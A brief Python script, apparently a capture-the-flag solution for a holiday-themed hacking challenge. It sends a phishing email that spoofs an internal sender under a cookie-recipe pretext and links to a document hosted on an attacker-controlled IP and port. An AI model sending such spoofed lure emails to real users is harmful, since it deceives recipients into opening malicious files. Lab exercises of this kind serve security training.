#!/usr/bin/env python3
from ewa import EWA

def phish():
    f = "jessica.claus@northpolechristmastown.com"
    to = "admin@northpolechristmastown.com"
    subject = "gingerbread cookie recipe"

    body = "hello!"
    body = "gingerbread cookie recipe\nATTACHED FILE DOWNLOAD HERE: http://10.142.0.11:8686/afile.docx"

    m = EWA()
    resp = m.send_mail(f, to, subject, body)
    print(resp)

if __name__ == "__main__":
    phish()
